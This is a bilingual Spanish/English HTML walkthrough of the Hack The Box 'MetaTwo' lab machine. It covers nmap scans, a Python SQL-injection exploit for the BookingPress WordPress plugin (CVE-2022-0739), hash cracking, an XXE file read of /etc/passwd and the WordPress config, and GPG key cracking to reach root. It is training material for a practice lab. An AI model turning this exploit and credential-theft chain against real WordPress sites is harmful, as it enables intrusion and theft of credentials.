@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Alejandro García Peláez" />
+  <title>MetaTwo Machine</title>
+  <script src="/src/translation.min.js" defer></script>
+  <style>
+    html {
+      line-height: 1.5;
+      font-family: Georgia, serif;
+      font-size: 14pt;
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 1em;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+      font-size: 85%;
+      margin: 0;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">MetaTwo Machine</h1>
+<p class="author">Alejandro García Peláez</p>
+<p class="date">10-02-2023</p>
+
+<div id="buttons" style="display: grid; justify-content: center;">
+  <button class="spanish button-class" id="lang-en" type="button"> English </button>
+  <button class="english button-class" id="lang-es" type="button"> Español </button>
+</div>
+
+</header>
+<div class="spanish">
+<ul>
+<li><a href="#reconocimiento">Reconocimiento</a><br></li>
+<li><a href="#obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso
+a la máquina víctima</a><br>
+<ul>
+<li><a href="#plugin-wp-cve-2022-0739">Plugin WP
+(CVE-2022-0739)</a><br></li>
+<li><a href="#john-the-ripper">John the Ripper</a><br></li>
+<li><a href="#xxe">XXE</a><br></li>
+<li><a href="#buscando-ficheros-con-ftp">Buscando ficheros con
+FTP</a><br></li>
+</ul></li>
+<li><a href="#escalada-de-privilegios">Escalada de Privilegios</a><br>
+<ul>
+<li><a href="#passpie-y-gpg-">Passpie y GPG</a><br></li>
+</ul></li>
+</ul>
+</div>
+<div class="english">
+<ul>
+<li><a href="#recognition">Recognition</a><br></li>
+<li><a href="#gaining-access-to-the-victim-machine">Gaining access to
+the victim machine</a><br>
+<ul>
+<li><a href="#plugin-wp-cve-2022-0739">Plugin WP
+(CVE-2022-0739)</a><br></li>
+<li><a href="#john-the-ripper">John the Ripper</a><br></li>
+<li><a href="#xxe">XXE</a><br></li>
+<li><a href="#searching-for-files-with-ftp">Searching for files with
+FTP</a><br></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege Escalation</a><br>
+<ul>
+<li><a href="#passpie-y-gpg-">Passpie y GPG</a><br></li>
+</ul></li>
+</ul>
+</div>
+<div class="spanish">
+<h1 id="reconocimiento">Reconocimiento</h1>
+<p>Empezamos viendo si la máquina víctima está disponible:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">ping</span> <span class="at">-c</span> 1 10.10.11.186</span></code></pre></div>
+<p><br></p>
+<pre><code>#PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.
+#64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=45.8 ms
+#
+#--- 10.10.11.186 ping statistics ---
+#1 packets transmitted, 1 received, 0% packet loss, time 0ms
+#rtt min/avg/max/mdev = 45.795/45.795/45.795/0.000 ms</code></pre>
+<p>Recordemos mirar el TTL para ver ante que máquina nos encontramos (
+en este caso GNU/Linux).</p>
+<p>Escaneamos los puertos para ver cuáles están abiertos:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p-</span> <span class="at">--open</span> <span class="at">-T5</span> <span class="at">-n</span> <span class="at">-Pn</span> 10.10.11.186 <span class="at">-oG</span> openTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>#Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 17:40 CET
+#Nmap scan report for 10.10.11.186
+#Host is up (0.050s latency).
+#Not shown: 65492 closed tcp ports (reset), 40 filtered tcp ports (no-response)
+#Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+#PORT   STATE SERVICE
+#21/tcp open  ftp
+#22/tcp open  ssh
+#80/tcp open  http
+#
+#Nmap done: 1 IP address (1 host up) scanned in 16.35 seconds</code></pre>
+<p>Vemos que ftp está desplegado, pero no podemos acceder a él mediante
+el usuario ‘anónimo’. Seguimos con el reconocimiento, es decir, lanzar
+con nmap una serie de scripts predefinidos para ver la versión de los
+distintos servicios:</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p21,22,80</span> 10.10.11.186 <span class="at">-oN</span> serviceTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>## Nmap 7.93 scan initiated Mon Feb 20 17:41:25 2023 as: nmap -p21,22,80 -sVC -oN nmap2.out 10.10.11.186
+#Nmap scan report for 10.10.11.186
+#Host is up (0.051s latency).
+#
+#PORT   STATE SERVICE VERSION
+#21/tcp open  ftp?
+#| fingerprint-strings: 
+#|   GenericLines: 
+#|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+#|     Invalid command: try being more creative
+#|_    Invalid command: try being more creative
+#22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+#| ssh-hostkey: 
+#|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+#|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+#|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+#80/tcp open  http    nginx 1.18.0
+#|_http-title: Did not follow redirect to http://metapress.htb/
+#|_http-server-header: nginx/1.18.0
+#
+#Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+## Nmap done at Mon Feb 20 17:44:55 2023 -- 1 IP address (1 host up) scanned in 209.89 seconds
+</code></pre>
+<p>Añadimos el dominio a nuestro fichero “/etc/hosts” y vemos la página
+web.</p>
+<h1 id="obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso a la
+máquina víctima</h1>
+<h2 id="plugin-wp-cve-2022-0739">Plugin WP (CVE-2022-0739)</h2>
+<p>Lo primero que llama la atención es:</p>
+<p><img src="images/metatwo1.png" /></p>
+<p>Por tanto hay que buscar a ver si hay algún plugin instalado y ver si
+es vulnerable; echando un vistazo al fuente de la página:</p>
+<p><img src="images/metatwo2.png" /></p>
+<p>Haciendo una búsqueda rápida, encontramos en wpscan:</p>
+<p><img src="images/metatwo3.png" /></p>
+<p>Lo que hay que hacer es crear una nueva entrada en el calendario y
+obtener un nonce de la petición POST al servidor:</p>
+<p><img src="images/metatwo4.png" /></p>
+<p>Una vez obtenido, en mi caso, he automatizado la SQLi con el
+siguiente script:</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># booking-plugin-exploit.py CVE-2022-0739</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="co"># author : Alejandro García Peláez</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests,sys</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>wp_nonce<span class="op">=</span><span class="st">&quot;99954e9c63&quot;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>URL <span class="op">=</span> <span class="st">&quot;http://metapress.htb/wp-admin/admin-ajax.php&quot;</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>  data <span class="op">=</span> {</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;action&#39;</span>: <span class="st">&#39;bookingpress_front_get_category_services&#39;</span>,</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;_wpnonce&#39;</span>:wp_nonce,</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;category_id&#39;</span>: <span class="dv">33</span>,</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;total_service&#39;</span>:<span class="st">&#39;-7502) </span><span class="sc">%s</span><span class="st">&#39;</span> <span class="op">%</span> sys.argv[<span class="dv">1</span>]</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>  resp <span class="op">=</span> requests.post(URL,data<span class="op">=</span>data)</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(resp.text)</span></code></pre></div>
+<p>Esto permite obtener la salida del SQLi por consola y fácilmente
+poder filtrar por expresiones regulares. La ‘query’ la introducimos como
+primer argumento a la hora de ejecutar el script.</p>
+<p>Ejecutando:</p>
+<p><img src="images/metatwo5.png" /></p>
+<h2 id="john-the-ripper">John the Ripper</h2>
+<p>Vemos que la vulnerabilidad es explotada correctamente y ya podemos
+empezar a recopilar información, primero las tablas que nos interesan,
+después las columnas de esas tablas y posteriormente usuarios y
+contraseñas (hash):</p>
+<p><img src="images/metatwo6.png" /></p>
+<p><img src="images/metatwo7.png" /></p>
+<p><img src="images/metatwo8.png" /></p>
+<p>Guardamos las contraseñas en un fichero y ejecutamos ‘john’ para
+obtener la contraseña:</p>
+<p><img src="images/metatwo9.png" /></p>
+<p>Con esto accedemos a WP como manager.</p>
+<h2 id="xxe">XXE</h2>
+<p>Una vez dentro podemos subir archivos … aunque solo deja subir
+archivos de sonido/imagen. Podemos ver la versión exacta del wordpress y
+a partir de ello encontrar una serie de vulnerabilidades. Tras ver si
+alguna de ellas era útil encontré algo que no conocía hasta ahora,
+llamado XXE; esta vulnerabilidad nos permite obtener el contenido de
+ficheros mediante la inyección de XML. Principalmente intento listar el
+contenido de ‘/etc/passwd’ para ver si funciona. Tenemos que crear un
+fichero con los primeros bytes que tendría un fichero de audio y
+posteriormente el XML pertinente. Una vez hecho esto apuntamos hacia un
+servicio web de nuestra máquina que contendrá el código restante para
+filtrar archivos. Una vez hecho esto, obtenemos (codificado) el
+contenido del fichero en cuestión:</p>
+<p><img src="images/metatwo10.png" /></p>
+<p>Decodificando:</p>
+<p><img src="images/metatwo11.png" /></p>
+<p>Vemos un usuario potencial. Intentamos listar ficheros de
+configuración, en este caso veamos el del WP:</p>
+<p><img src="images/metatwo12.png" /></p>
+<p>Dos credenciales; una de ellas para BBDD y otra para el ftp del
+inicio.</p>
+<h2 id="buscando-ficheros-con-ftp">Buscando ficheros con FTP</h2>
+<p>Tras buscar un largo rato, encontré el siguiente fichero, que parece
+que gestiona el envío de email una vez que se crear un nuevo evento; en
+él obtenemos las credenciales del usuario anterior y accedemos al equipo
+víctima</p>
+<p><img src="images/metatwo13.png" /></p>
+<p><img src="images/metatwo14.png" /></p>
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+<h2 id="passpie-y-gpg">Passpie y GPG</h2>
+<p>Listando por ficheros que pertenecen al usuario, podemos encontrar un
+software llamado ‘passpie’, gestor de contraseñas. Hay algunos ficheros
+que nos interesan más que otros; si ejecutamos ‘passpie’ vemos que hay
+dos credenciales la de nuestro usuario y la de root; si intentamos
+exportarlas no nos dejará dado que tenemos que tener la “passphrase”.
+Para ellos nos descargamos el archivo ‘.keys’ que contiene las claves
+privadas y públicas pgp; con gpg2john pasamos la clave privada a un
+formato entendible para ‘The Ripper’ a ver si tenemos suerte y podemos
+obtener la clave que nos falta; tras unos segundos la obtenemos y
+podemos acceder a una consola con permisos de administrador:</p>
+<p><img src="images/metatwo15.png" /></p>
+<p><img src="images/metatwo16.png" /></p>
+<p><img src="images/metatwo17.png" /></p>
+</div>
+<div class="english">
+<h1 id="recognition">Recognition</h1>
+<p>We start by checking if the victim machine is available:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">ping</span> <span class="at">-c</span> 1 10.10.11.186</span></code></pre></div>
+<p><br></p>
+<pre><code>#PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.
+#64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=45.8 ms
+#
+#--- 10.10.11.186 ping statistics ---
+#1 packets transmitted, 1 received, 0% packet loss, time 0ms
+#rtt min/avg/max/mdev = 45.795/45.795/45.795/0.000 ms</code></pre>
+<p>Remember to look at the TTL to see which machine we are on (in this
+case GNU/Linux).</p>
+<p>Scan the ports to see which ones are open:</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p-</span> <span class="at">--open</span> <span class="at">-T5</span> <span class="at">-n</span> <span class="at">-Pn</span> 10.10.11.186 <span class="at">-oG</span> openTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>#Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 17:40 CET
+#Nmap scan report for 10.10.11.186
+#Host is up (0.050s latency).
+#Not shown: 65492 closed tcp ports (reset), 40 filtered tcp ports (no-response)
+#Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+#PORT   STATE SERVICE
+#21/tcp open  ftp
+#22/tcp open  ssh
+#80/tcp open  http
+#
+#Nmap done: 1 IP address (1 host up) scanned in 16.35 seconds</code></pre>
+<p>We see that ftp is deployed, but we cannot access it through the
+‘anonymous’ user. We continue with the reconnaissance, that is to say,
+to launch with nmap a series of predefined scripts to see the version of
+the different services:</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p21,22,80</span> 10.10.11.186 <span class="at">-oN</span> serviceTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>## Nmap 7.93 scan initiated Mon Feb 20 17:41:25 2023 as: nmap -p21,22,80 -sVC -oN nmap2.out 10.10.11.186
+#Nmap scan report for 10.10.11.186
+#Host is up (0.051s latency).
+#
+#PORT   STATE SERVICE VERSION
+#21/tcp open  ftp?
+#| fingerprint-strings: 
+#|   GenericLines: 
+#|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+#|     Invalid command: try being more creative
+#|_    Invalid command: try being more creative
+#22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+#| ssh-hostkey: 
+#|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+#|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+#|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+#80/tcp open  http    nginx 1.18.0
+#|_http-title: Did not follow redirect to http://metapress.htb/
+#|_http-server-header: nginx/1.18.0
+#
+#Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+## Nmap done at Mon Feb 20 17:44:55 2023 -- 1 IP address (1 host up) scanned in 209.89 seconds
+</code></pre>
+<p>We add the domain to our “/etc/hosts” file and we see the web
+page.</p>
+<h1 id="gaining-access-to-the-victim-machine">Gaining access to the
+victim machine</h1>
+<h2 id="plugin-wp-cve-2022-0739-1">Plugin WP (CVE-2022-0739)</h2>
+<p>The first thing that catches the eye is:</p>
+<p><img src="images/metatwo1.png" /></p>
+<p>So you have to look to see if there is a plugin installed and see if
+it is vulnerable by looking at the source of the page:</p>
+<p><img src="images/metatwo2.png" /></p>
+<p>Doing a quick search, we found on wpscan:</p>
+<p><img src="images/metatwo3.png" /></p>
+<p>What you need to do is to create a new entry in the calendar and get
+a nonce from the POST request to the server:</p>
+<p><img src="images/metatwo4.png" /></p>
+<p>Once obtained, in my case, I have automated the SQLi with the
+following script:</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co"># booking-plugin-exploit.py CVE-2022-0739</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="co"># author : Alejandro García Peláez</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests,sys</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>wp_nonce<span class="op">=</span><span class="st">&quot;99954e9c63&quot;</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>URL <span class="op">=</span> <span class="st">&quot;http://metapress.htb/wp-admin/admin-ajax.php&quot;</span></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>  data <span class="op">=</span> {</span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;action&#39;</span>: <span class="st">&#39;bookingpress_front_get_category_services&#39;</span>,</span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;_wpnonce&#39;</span>:wp_nonce,</span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;category_id&#39;</span>: <span class="dv">33</span>,</span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;total_service&#39;</span>:<span class="st">&#39;-7502) </span><span class="sc">%s</span><span class="st">&#39;</span> <span class="op">%</span> sys.argv[<span class="dv">1</span>]</span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a>  resp <span class="op">=</span> requests.post(URL,data<span class="op">=</span>data)</span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(resp.text)</span></code></pre></div>
+<p>This allows us to get the SQLi output by console and easily filter by
+regular expressions. The ‘query’ is entered as the first argument when
+executing the script.</p>
+<p>Executing:</p>
+<p><img src="images/metatwo5.png" /></p>
+<h2 id="john-the-ripper-1">John the Ripper</h2>
+<p>We see that the vulnerability is successfully exploited and we can
+start collecting information, first the tables we are interested in,
+then the columns of those tables and then users and passwords
+(hash):</p>
+<p><img src="images/metatwo6.png" /></p>
+<p><img src="images/metatwo7.png" /></p>
+<p><img src="images/metatwo8.png" /></p>
+<p>We save the passwords in a file and run ‘john’ to get the
+password:</p>
+<p><img src="images/metatwo9.png" /></p>
+<p>With this we access WP as manager.</p>
+<h2 id="xxe-1">XXE</h2>
+<p>Once inside we can upload files … although it only allows to upload
+sound/image files. We can see the exact version of wordpress and from
+this we can find a series of vulnerabilities. After seeing if any of
+them were useful I found something I didn’t know about until now, called
+XXE; this vulnerability allows us to get the content of files by XML
+injection. Mainly I try to list the content of ‘/etc/passwd’ to see if
+it works. We have to create a file with the first bytes that an audio
+file would have and then the relevant XML. Once this is done we point to
+a web service on our machine that will contain the remaining code to
+filter files. Once this is done, we get (encoded) the content of the
+file in question:</p>
+<p><img src="images/metatwo10.png" /></p>
+<p>Decoding:</p>
+<p><img src="images/metatwo11.png" /></p>
+<p>We see a potential user.We try to list configuration files, in this
+case let’s see the WP one:</p>
+<p><img src="images/metatwo12.png" /></p>
+<p>Two credentials; one of them for BBDD and another one for the ftp of
+the startup.</p>
+<h2 id="searching-for-files-with-ftp">Searching for files with FTP</h2>
+<p>After searching for a long time, I found the following file, which
+seems to manage the sending of email once a new event is created; in it
+we obtain the credentials of the previous user and access the victim
+computer.</p>
+<p><img src="images/metatwo13.png" /></p>
+<p><img src="images/metatwo14.png" /></p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="passpie-y-gpg-1">Passpie y GPG</h2>
+<p>Listing by files that belong to the user, we can find a software
+called ‘passpie’, password manager. There are some files that interest
+us more than others; if we run ‘passpie’ we see that there are two
+credentials, our user’s and root; if we try to export them it will not
+let us since we have to have the “passphrase”. For them we download the
+‘.keys’ file that contains the private and public pgp keys; with
+gpg2john we pass the private key to a format understandable for ‘The
+Ripper’ to see if we are lucky and we can obtain the key that we lack;
+after a few seconds we obtain it and we can access to a console with
+administrator permissions:</p>
+<p><img src="images/metatwo15.png" /></p>
+<p><img src="images/metatwo16.png" /></p>
+<p><img src="images/metatwo17.png" /></p>
+</div>
+</body>
+</html>
+
+<style>
+
+html{
+  background-color: #f5f5fa;
+}
+
+body{
+  background-color: white;
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+
+.hidden{
+  display: none
+}
+
+.block{
+  display: block;
+}
+
+h1{
+  font-size: 19pt;
+}
+
+h2{
+  font-size: 16pt;
+}
+
+h3{
+  font-size: 14pt;
+}
+
+.button-class{
+  cursor: pointer;
+  --tw-border-opacity: 1;
+  border-color: rgb(0 0 0 / var(--tw-border-opacity));
+  border-width: 2px;
+  margin-top: 0.5rem;
+  background-color: transparent;
+  background-image: none;
+  font-family: inherit;
+  font-feature-settings: inherit;
+  font-variation-settings: inherit;
+  font-size: 100%;
+  font-weight: inherit;
+  line-height: inherit;
+  color: inherit;
+  --tw-border-spacing-x: 0;
+  --tw-border-spacing-y: 0;
+  --tw-translate-x: 0;
+  --tw-translate-y: 0;
+  --tw-rotate: 0;
+  --tw-skew-x: 0;
+  --tw-skew-y: 0;
+  --tw-scale-x: 1;
+  --tw-scale-y: 1;
+  --tw-pan-x: ;
+  --tw-pan-y: ;
+  --tw-pinch-zoom: ;
+  --tw-scroll-snap-strictness: proximity;
+  --tw-gradient-from-position: ;
+  --tw-gradient-via-position: ;
+  --tw-gradient-to-position: ;
+  --tw-ordinal: ;
+  --tw-slashed-zero: ;
+  --tw-numeric-figure: ;
+  --tw-numeric-spacing: ;
+  --tw-numeric-fraction: ;
+  --tw-ring-inset: ;
+  --tw-ring-offset-width: 0px;
+  --tw-ring-offset-color: #fff;
+  --tw-ring-color: rgb(59 130 246 / 0.5);
+  --tw-ring-offset-shadow: 0 0 #0000;
+  --tw-ring-shadow: 0 0 #0000;
+  --tw-shadow: 0 0 #0000;
+  --tw-shadow-colored: 0 0 #0000;
+  --tw-blur: ;
+  --tw-brightness: ;
+  --tw-contrast: ;
+  --tw-grayscale: ;
+  --tw-hue-rotate: ;
+  --tw-invert: ;
+  --tw-saturate: ;
+  --tw-sepia: ;
+  --tw-drop-shadow: ;
+  --tw-backdrop-blur: ;
+  --tw-backdrop-brightness: ;
+  --tw-backdrop-contrast: ;
+  --tw-backdrop-grayscale: ;
+  --tw-backdrop-hue-rotate: ;
+  --tw-backdrop-invert: ;
